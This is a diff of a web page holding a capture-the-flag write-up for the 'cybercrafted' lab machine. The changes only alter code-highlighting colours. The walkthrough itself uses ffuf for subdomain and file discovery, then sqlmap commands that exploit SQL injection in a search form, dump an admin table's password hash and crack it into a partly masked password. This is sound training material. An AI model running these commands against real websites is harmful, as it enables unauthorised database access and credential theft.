@@ -253,7 +253,7 @@ if (!doNotTrack) {
 </li>
 </ul>
 <p>Found a bunch of subdomains using ffuf.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ffuf -w /opt/wordlists/raft-medium-words.txt:SUBS -H <span style="color:#e6db74">&#34;Host: SUBS.cybercrafted.thm&#34;</span> -u http://10.10.212.240 -fs <span style="color:#ae81ff">0</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ffuf -w /opt/wordlists/raft-medium-words.txt:SUBS -H <span style="color:#0086d2">&#34;Host: SUBS.cybercrafted.thm&#34;</span> -u http://10.10.212.240 -fs <span style="color:#0086f7;font-weight:bold">0</span>
 </span></span></code></pre></div><pre><code>Subs Found:
 admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
 store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 100ms]
@@ -270,7 +270,7 @@ index                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration
 <ul>
 <li>Found Search Engine At <a href="http://store.cybercrafted.thm/search.php">http://store.cybercrafted.thm/search.php</a></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://store.cybercrafted.thm/FILE.php -mc 200,302
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://store.cybercrafted.thm/FILE.php -mc 200,302
 </span></span></code></pre></div><pre><code>search                  [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 106ms]
 </code></pre>
 <h3 id="interesting-discoveries" >Interesting Discoveries
@@ -294,14 +294,14 @@ Using Sqlmap to automate exploitation of our sql injecetion .</p>
 <ul>
 <li>
 <p>Tables (Database: Webapp)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -u http://store.cybercrafted.thm/search.php --data <span style="color:#e6db74">&#34;search=*&amp;submit=&#34;</span> --tables
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -u http://store.cybercrafted.thm/search.php --data <span style="color:#0086d2">&#34;search=*&amp;submit=&#34;</span> --tables
 </span></span></code></pre></div><p>| :&mdash;   |
 | admin  |
 | stock  |</p>
 </li>
 <li>
 <p>Columns (Table Admin)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -u http://store.cybercrafted.thm/search.php --data <span style="color:#e6db74">&#34;search=*&amp;submit=&#34;</span> --tamper<span style="color:#f92672">=</span>space2comment -D webapp -T admin --columns --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -u http://store.cybercrafted.thm/search.php --data <span style="color:#0086d2">&#34;search=*&amp;submit=&#34;</span> --tamper=space2comment -D webapp -T admin --columns --threads=<span style="color:#0086f7;font-weight:bold">10</span>
 </span></span></code></pre></div><table>
 <thead>
 <tr>
@@ -329,7 +329,7 @@ Using Sqlmap to automate exploitation of our sql injecetion .</p>
 <p>Columns Dump</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://store.cybercrafted.thm/search.php --data <span style="color:#e6db74">&#34;search=*&amp;submit=&#34;</span> --tamper<span style="color:#f92672">=</span>space2comment -D webapp -T admin --dump --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> 
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://store.cybercrafted.thm/search.php --data <span style="color:#0086d2">&#34;search=*&amp;submit=&#34;</span> --tamper=space2comment -D webapp -T admin --dump --threads=<span style="color:#0086f7;font-weight:bold">10</span> 
 </span></span></code></pre></div><pre><code>| id | hash                                     | user                |
 |:---|------------------------------------------|---------------------|
 | 1  | 88b949dd5cdfbeAAAAAAAAbfa24e5974234e7c01 | xXUltimateCreeperXx |
@@ -348,7 +348,7 @@ Using Sqlmap to automate exploitation of our sql injecetion .</p>
 </h3><ul>
 <li>
 <p>Password Hash Cracked thanks to <span style="color:blue"><em>crackstation</em></span></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;xXUltimateCreeperXx&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;diamondAAAAAAAA&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#0086d2">&#34;xXUltimateCreeperXx&#34;</span>: <span style="color:#0086d2">&#34;diamondAAAAAAAA&#34;</span>
 </span></span></code></pre></div></li>
 </ul>
 <h3 id="command-execution" >Command Execution
